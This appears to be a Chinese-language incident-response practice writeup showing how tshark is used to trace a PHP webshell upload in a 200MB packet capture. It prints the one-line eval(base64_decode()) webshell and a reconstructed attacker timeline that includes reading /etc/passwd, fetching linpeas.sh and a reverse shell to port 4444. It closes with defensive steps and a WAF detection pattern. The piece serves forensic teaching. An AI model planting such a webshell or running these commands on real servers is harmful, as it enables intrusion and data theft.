Misc 流量分析 tshark 应急响应

Misc 流量分析：从 pcap 里捞出 WebShell 的完整过程

2026-08-25 · 约 8 分钟 · 应急响应练习

拿到一个 200MB 的抓包，只知道「有台 Web 服务器被上传了东西」。 这篇记录我怎么用 tshark 从海量流量里一步步缩小范围，最后还原出木马和被执行的命令。

这是一篇示例文章，用来演示正文排版。换成你自己的 writeup 后，把这段提示删掉即可。

先定策略：不要直接开 Wireshark

200MB 的包直接丢进 Wireshark，滚动几万条流量只会让人放弃。 我的顺序永远是：先看协议分布 → 锁定 HTTP → 只看有 POST 的 → 再导出对象。 

# 协议统计，先看看这个包大概是什么场景
tshark -r capture.pcap -q -z io,phs

# 只看 HTTP 请求的主机与路径，按时间排序
tshark -r capture.pcap -Y "http.request" -T fields \
  -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri

输出里很快就出现了可疑的一条：

POST  /upload.php            10.0.0.15 -> 10.0.0.80
POST  /upload/shell.php      10.0.0.15 -> 10.0.0.80
GET   /upload/shell.php?cmd= 10.0.0.15 -> 10.0.0.80

导出对象：把上传的文件拿出来

tshark 的 --export-objects 会把 HTTP 响应体和上传内容落盘，比手工复制二进制靠谱：

mkdir -p out
tshark -r capture.pcap --export-objects http,./out -q

ls -lh out | sort -k5 -h | tail

按大小排序，最大的那个 shell.php 就是传上去的木马。打开看内容：

<?php
// 一眼假的一句话：eval 里套了 base64 解码
@eval(base64_decode($_POST['pass']));
?>

别在本机直接运行它。分析木马请放到隔离的虚拟机里，或者只用文本方式解包，不要 php shell.php。

还原攻击者执行了什么

一句话木马每次请求都带 pass 参数，把相关请求的 body 全部导出来：

tshark -r capture.pcap \
  -Y 'http.request.method == "POST" && http.request.uri contains "shell.php"' \
  -T fields -e frame.time -e http.file_data

把每段 base64 解出来，时间线就清楚了：

时间动作
14:02:11上传 shell.php
14:03:40system('id') 确认权限 www-data
14:05:02cat /etc/passwd
14:07:31下载 linpeas.sh 做提权探测
14:19:08外连 45.x.x.x:4444（反弹 shell）

别漏掉加密流量

HTTP 里有明文是运气好。真正需要留意的是「时间上紧跟在 webshell 请求之后，却看不出内容」的那些连接。 用下面两条过滤，能快速捞出可疑外连： 

# 非标准端口的 TCP 连接
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn | head

# DNS 里有没有奇怪的长域名（可能是 DNS 隧道）
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name \
  | awk '{ print length($0), $0 }' | sort -rn | head

复盘

  • 先统计、再过滤、最后导出，是大包分析唯一不崩的顺序。
  • -T fields 比图形界面快一个数量级，配合 sort | uniq -c 能直接看到「谁在跟谁说话」。
  • 时间线比单个 payload 更重要：上传 → 执行 → 提权 → 外连，这条链就是完整的攻击叙事。
  • webshell 的 pass 参数往往带 base64，逐个解码比盯着 hex 看高效得多。

如果我是防守方

  • 上传目录禁止执行：Nginx 里对 upload/ 关掉 php 解析。
  • 文件上传做白名单 + 内容类型校验 + 重命名，不保留用户原始扩展名。
  • WAF 规则里加一条：POST body 出现 eval(base64_decode( 直接拦截并告警。
  • 出网流量做白名单，内网 Web 服务器不应该能主动连 4444 这种端口。
